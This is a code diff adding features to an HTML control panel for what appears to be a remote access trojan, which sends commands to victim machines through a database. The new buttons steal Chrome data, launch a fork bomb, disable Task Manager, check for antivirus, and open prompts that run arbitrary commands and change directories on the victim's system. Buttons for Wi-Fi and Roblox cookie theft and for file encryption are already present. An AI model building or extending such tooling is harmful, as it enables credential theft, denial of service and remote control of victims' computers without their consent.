@@ -294,6 +294,8 @@
                 <div class="btn-grid">
                     <button class="btn-primary" style="background-color: #a855f7; border: none; color: white;" onclick="cmd('wifi_stealer')"></i> Steal Wi-Fi</button>
                     <button class="btn-warn" style="background-color: #a855f7; border: none; color: white;" onclick="cmd('grab_roblox')"></i> Roblox Cookie</button>
+                    <button class="btn-warn full-width" style="background-color: #a855f7; border: none; color: white;" onclick="cmd('chrome_steal')">Steal Chrome</button>
+                    <button class="btn-info full-width" style="background-color: #a855f7; border: none; color: white;" onclick="cmd('get_ip')">Get IP Info</button>
                 </div>
             </div>
             <!-- 4. ENCRYPTION -->
@@ -302,6 +304,7 @@
                 <div class="btn-grid">
                     <button class="btn-danger" style="background-color: #00e2e2; border: none; color: white;" onclick="askForceEncrypt()"></i> Encrypt</button>
                     <button class="btn-success" style="background-color: #00e2e2; border: none; color: white;" onclick="askDecrypt()"></i> Decrypt</button>
+                    <button class="btn-danger full-width" style="background-color: #00e2e2; border: none; color: white;" onclick="confirmAction('enable_safe_mode')">Enable Safe Mode</button>
                 </div>
             </div>
 
@@ -315,10 +318,22 @@
                     <button class="btn-danger" style="background-color: var(--success); border: none; color: white;" onclick="cmd('block_screen')"></i> Block Screen</button>
                     <button class="btn-neutral" style="background-color: var(--success); border: none; color: white;" onclick="cmd('hide_taskbar')"></i> Hide Taskbar</button>
                     <button class="btn-primary" style="background-color: var(--success); border: none; color: white;" onclick="cmd('show_taskbar')"></i> Show Taskbar</button>
+                    <button class="btn-danger full-width" style="background-color: var(--success); border: none; color: white;" onclick="confirmAction('forkbomb')">FORK BOMB</button>
                     
                     <div class="slider-container">
                         <input type="range" min="0" max="100" value="50" onchange="setVolume(this.value)">
                     </div>
+                </div>
+            </div>
+            <!-- 6. System -->
+            <div class="card" style="border-top: 3px solid #badb00;">
+                <div class="card-title"><i class="ph ph-lightning" style="color:var(--warn);"></i> Power Control</div>
+                <div class="btn-grid">
+                    <button class="btn-danger" style="background-color: #badb00; border: none; color: white;" onclick="cmd('taskmgr_off')">Disable TaskMgr</button>
+                    <button class="btn-success" style="background-color: #badb00; border: none; color: white;" onclick="cmd('taskmgr_on')">Enable TaskMgr</button>
+                    <button class="btn-warn" style="background-color: #badb00; border: none; color: white;" onclick="cmd('check_av')">Check AV</button>
+                    <button class="btn-info full-width" style="background-color: #badb00; border: none; color: white;" onclick="askCD()">CD Directory</button>
+                    <button class="btn-neutral full-width" style="background-color: #badb00;border: none; color: white;" onclick="askExecute()">Execute Command</button>
                 </div>
             </div>
 
@@ -520,7 +535,9 @@
         window.cmd = (type) => writeDB({ type });
         window.confirmAction = (type) => { if(confirm("Are you sure?")) cmd(type); };
         window.toggleInput = (block) => cmd(block ? 'disable_input' : 'enable_input');
-        
+        window.askCD = () => { const p = prompt("Path:"); if(p) writeDB({type:'cd', path:p}); };
+        window.askExecute = () => { const c = prompt("Command (e.g. dir):"); if(c) writeDB({type:'execute', cmd:c}); };
+
         window.askTTS = () => { const t = prompt("Text to speak:"); if(t) writeDB({type:'tts', text:t}); };
         window.askMsgBox = () => { const t = prompt("Message:"); if(t) writeDB({type:'msgbox', text:t}); };
         window.setVolume = (v) => writeDB({type:'volume', value:v});
